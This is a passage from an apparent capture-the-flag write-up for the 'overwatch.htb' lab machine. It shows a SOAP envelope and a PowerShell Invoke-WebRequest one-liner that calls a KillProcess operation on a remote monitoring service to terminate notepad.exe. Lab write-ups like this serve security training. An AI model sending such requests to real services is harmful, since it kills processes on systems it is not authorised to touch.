  <soap:Body>
    <tns:KillProcess>
      <tns:processName>notepad.exe</tns:processName>
    </tns:KillProcess>
  </soap:Body>
</soap:Envelope>

# 3. Send the request
SOAPAction header format: "http://tempuri.org/IMonitoringService/<OperationName>"
                                                       ^-- namespace            ^-- interface         ^-- method

# PowerShell : Invoke-WebRequest
(Invoke-WebRequest -Uri "http://overwatch.htb:8000/MonitorService" -Method POST -Headers @{"Content-Type"="text/xml";"SOAPAction"='"http://tempuri.org/IMonitoringService/KillProcess"'} -Body '<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tns="http://tempuri.org/"><soap:Body><tns:KillProcess><tns:processName>notepad.exe</tns:processName></tns:KillProcess></soap:Body></soap:Envelope>' -UseBasicParsing).Content
```
{% endraw %}
